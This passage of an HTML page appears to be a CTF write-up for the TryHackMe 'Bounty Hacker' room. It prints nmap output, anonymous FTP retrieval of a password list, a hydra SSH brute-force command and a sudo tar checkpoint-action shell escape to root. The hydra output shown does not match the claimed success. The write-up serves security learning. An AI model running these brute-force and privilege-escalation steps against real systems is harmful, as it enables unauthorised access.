+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.18<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span><span class="p">|</span>_http-title:<span class="w"> </span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>Site<span class="w"> </span>doesn<span class="err">&#39;</span>t<span class="w"> </span>have<span class="w"> </span>a<span class="w"> </span>title<span class="w"> </span><span class="o">(</span>text/html<span class="o">)</span>.<span class="p">|</span>_http-server-header:<span class="w"> </span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>Apache/2.4.18<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>HP<span class="w"> </span>P2000<span class="w"> </span>G3<span class="w"> </span>NAS<span class="w"> </span>device<span class="w"> </span><span class="o">(</span><span class="m">91</span>%<span class="o">)</span>,<span class="w"> </span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>Linux<span class="w"> </span><span class="m">2</span>.6.32<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">2</span>.6.32<span class="w"> </span>-<span class="w"> </span><span class="m">3</span>.1<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,<span class="w"> </span>Ubiquiti<span class="w"> </span>AirMax<span class="w"> </span>NanoStation<span class="w"> </span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>WAP<span class="w"> </span><span class="o">(</span>Linux<span class="w"> </span><span class="m">2</span>.6.32<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.7<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.0<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.1<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>Ubiquiti<span class="w"> </span>AirOS<span class="w"> </span><span class="m">5</span>.5.9<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.0<span class="w"> </span>-<span class="w"> </span><span class="m">5</span>.4<span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Ubiquiti<span class="w"> </span>Pico<span class="w"> </span>Station<span class="w"> </span>WAP
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="o">(</span>AirOS<span class="w"> </span><span class="m">5</span>.2.6<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">5</span><span class="w"> </span>hopsService<span class="w"> </span>Info:<span class="w"> </span>OSs:<span class="w"> </span>Unix,<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>o:linux:linux_kernelTRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">80</span>/tcp<span class="o">)</span>HOP<span class="w"> </span>RTT<span class="w">       </span>ADDRESS1<span class="w">   </span>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="m">22</span>.96<span class="w"> </span>ms<span class="w">  </span><span class="m">10</span>.17.0.12<span class="w">   </span>...<span class="w"> </span><span class="m">45</span><span class="w">   </span><span class="m">145</span>.37<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.10.0.198OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.Nmap<span class="w"> </span>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">33</span>.70<span class="w"> </span>seconds
+</span></code></pre></div>
+<p>We can see in the nmap result that ftp port 21 and ssh port 22 is open firstly im going to try ftp into the machine.</p>
+<p>FTP into the machine.</p>
+<p>The FTP is accessible try login with anonymous. command :-</p>
+<p>Ftp <IP_Address> when asked for user enter anonymous.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ftp&gt;<span class="w"> </span>ls<span class="w"> </span>-la200<span class="w"> </span>PORT<span class="w"> </span><span class="nb">command</span><span class="w"> </span>successful.<span class="w"> </span>Consider<span class="w"> </span>using<span class="w"> </span>PASV.150<span class="w"> </span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Here<span class="w"> </span>comes<span class="w"> </span>the<span class="w"> </span>directory<span class="w"> </span>listing.
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>drwxr-xr-x<span class="w">    </span><span class="m">2</span><span class="w"> </span>ftp<span class="w">      </span>ftp<span class="w">          </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">07</span><span class="w"> </span><span class="m">21</span>:47<span class="w"> </span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>drwxr-xr-x<span class="w">    </span><span class="m">2</span><span class="w"> </span>ftp<span class="w">      </span>ftp<span class="w">          </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">07</span><span class="w"> </span><span class="m">21</span>:47<span class="w"> </span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>-rw-rw-r--<span class="w">    </span><span class="m">1</span><span class="w"> </span>ftp<span class="w">      </span>ftp<span class="w">           </span><span class="m">418</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">07</span><span class="w"> </span><span class="m">21</span>:41<span class="w"> </span>locks.txt
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>-rw-rw-r--<span class="w">    </span><span class="m">1</span><span class="w"> </span>ftp<span class="w">      </span>ftp<span class="w">            </span><span class="m">68</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">07</span><span class="w"> </span><span class="m">21</span>:47<span class="w"> </span>task.txt226<span class="w"> </span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Directory<span class="w"> </span>send<span class="w"> </span>OK.ftp&gt;
+</span></code></pre></div>
+<p>We got 2 files in afte we successfully logined in into the ftp server.</p>
+<p>Get the files locks.txt and task.txt they are needed in further enumeration.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>get<span class="w"> </span>task.txtget<span class="w"> </span>locks.txt
+</span></code></pre></div>
+<p>After this we analysed the files and in task.txt we found a user (lin).</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span>cat<span class="w"> </span>task.txt1.<span class="o">)</span><span class="w"> </span>Protect<span class="w"> </span>Vicious.2.<span class="o">)</span><span class="w"> </span>Plan<span class="w"> </span><span class="k">for</span><span class="w"> </span>Red<span class="w"> </span>Eye<span class="w"> </span>pickup<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>moon.-lin
+</span></code></pre></div>
+<p>locks.txt Clearly looks like a wordlist so we will use it for bruteforce.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>*$<span class="w"> </span>cat<span class="w"> </span>locks.txt*<span class="w"> </span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>-<span class="w"> </span>rEddrAGON-<span class="w"> </span>ReDdr4g0nSynd!cat3
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>-<span class="w"> </span>Dr@gOn<span class="nv">$yn9icat3</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>-<span class="w"> </span>R3DDr46ONSYndIC@Te-<span class="w"> </span>ReddRA60N
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>-<span class="w"> </span>R3dDrag0nSynd1c4te-<span class="w"> </span>dRa6oN5YNDiCATE
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>-<span class="w"> </span>ReDDR4g0n5ynDIc4te-<span class="w"> </span>R3Dr4gOn2044
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>-<span class="w"> </span>RedDr4gonSynd1cat3-<span class="w"> </span>R3dDRaG0Nsynd1c@T3
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>-<span class="w"> </span>Synd1c4teDr@g0n-<span class="w"> </span>reddRAg0N
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>-<span class="w"> </span>REddRaG0N5yNdIc47e-<span class="w"> </span>Dra6oN<span class="nv">$yndIC</span>@t3
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>-<span class="w"> </span>4L1mi6H71StHeB357-<span class="w"> </span>rEDdragOn<span class="nv">$ynd1c473</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>-<span class="w"> </span>DrAgoN5ynD1cATE-<span class="w"> </span>ReDdrag0n<span class="nv">$ynd1cate</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>-<span class="w"> </span>Dr@gOn<span class="nv">$yND1C4Te</span>-<span class="w"> </span>RedDr@gonSyn9ic47e
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>-<span class="w"> </span>REd<span class="nv">$yNdIc47e</span>-<span class="w"> </span>dr@goN5YNd1c@73
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>-<span class="w"> </span>rEDdrAGOnSyNDiCat3-<span class="w"> </span>r3ddr@g0N-<span class="w"> </span>ReDSynd1ca7e
+</span></code></pre></div>
+<p>I used hydra to brute force ssh login using the user name lin and the wordlist locks.txt.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>lin<span class="w"> </span>-P<span class="w"> </span>locks.txt<span class="w"> </span>&lt;IP_Address&gt;<span class="w"> </span>ssh
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Hydra<span class="w"> </span>v9.2<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2021</span><span class="w"> </span>by<span class="w"> </span>van<span class="w"> </span>Hauser/THC<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>David<span class="w"> </span>Maciejak<span class="w"> </span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>-<span class="w"> </span>Please<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>use<span class="w"> </span><span class="k">in</span><span class="w"> </span>military<span class="w"> </span>or<span class="w"> </span>secret<span class="w"> </span>service<span class="w"> </span>organizations,<span class="w"> </span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>or<span class="w"> </span><span class="k">for</span><span class="w"> </span>illegal<span class="w"> </span>purposes<span class="w"> </span><span class="o">(</span>this<span class="w"> </span>is<span class="w"> </span>non-binding,<span class="w"> </span>these<span class="w"> </span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>***<span class="w"> </span>ignore<span class="w"> </span>laws<span class="w"> </span>and<span class="w"> </span>ethics<span class="w"> </span>anyway<span class="o">)</span>.
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>Hydra<span class="w"> </span><span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span><span class="w"> </span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>starting<span class="w"> </span>at<span class="w"> </span><span class="m">2021</span>-12-22<span class="w"> </span><span class="m">21</span>:45:38<span class="o">[</span>DATA<span class="o">]</span><span class="w"> </span>max<span class="w"> </span><span class="m">16</span><span class="w"> </span>tasks<span class="w"> </span>per<span class="w"> </span><span class="m">1</span><span class="w"> </span>server,
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>overall<span class="w"> </span><span class="m">16</span><span class="w"> </span>tasks,<span class="w"> </span><span class="m">26</span><span class="w"> </span>login<span class="w"> </span>tries<span class="w"> </span><span class="o">(</span>l:1/p:26<span class="o">)</span>,<span class="w"> </span>~2<span class="w"> </span>tries<span class="w"> </span>per<span class="w"> </span>task<span class="o">[</span>DATA<span class="o">]</span><span class="w"> </span>attacking<span class="w"> </span>ftp://10.10.0.198:21/1<span class="w"> </span>of<span class="w"> </span><span class="m">1</span><span class="w"> </span>target<span class="w"> </span>completed,<span class="w"> </span><span class="m">0</span><span class="w"> </span>valid<span class="w"> </span>password<span class="w"> </span>foundHydra<span class="w"> </span><span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span><span class="w"> </span>finished<span class="w"> </span>at<span class="w"> </span><span class="m">2021</span>-12-22<span class="w"> </span><span class="m">21</span>:45:39
+</span></code></pre></div>
+<p>We found the password and login via ssh we see the user flag we just cat the user flag user.txt — THM{userflag}.</p>
+<p>Now we need to escalate our privilege we can exploit lin’s sudo privilege.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>lin@bountyhacker:~$<span class="w"> </span>sudo<span class="w"> </span>-l<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>lin:<span class="w"> </span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>lin<span class="w"> </span>on<span class="w"> </span>bountyhacker:<span class="w">    </span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/binUser<span class="w"> </span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>lin<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>bountyhacker:<span class="w">    </span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>/bin/tar
+</span></code></pre></div>
+<p>I searched more on tar sudo privilege escaltion and found this.</p>
+<p>just run the following command.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo<span class="w"> </span>tar<span class="w"> </span>-cf<span class="w"> </span>/dev/null<span class="w"> </span>/dev/null<span class="w"> </span>-<span class="w"> </span><span class="nv">checkpoint</span><span class="o">=</span><span class="m">1</span><span class="w"> </span>-<span class="w"> </span>checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>/bin/sh
+</span></code></pre></div>
+<p><a class="glightbox" href="../../assets/bounty_hunter2.webp" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="Open Lightbox" class="glightbox center" src="../../assets/bounty_hunter2.webp" width="500" /></a>
+Now we have a root access you can see by typing :- sudo -l.</p>
+<p>And got the root access and the root flag.</p>
+<p><a class="glightbox" href="../../assets/bounty_hunter3.webp" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="Open Lightbox" class="glightbox center" src="../../assets/bounty_hunter3.webp" width="500" /></a>
+Thank you for reading</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../HackTheBox-Canvas/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Canva">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Canva
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../TryHackMe-Brooklyn-Nine-Nine/" class="md-footer__link md-footer__link--next" aria-label="Next: Brooklyn-Nine-Nine">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Brooklyn-Nine-Nine
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.footer"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.56ea9cef.min.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
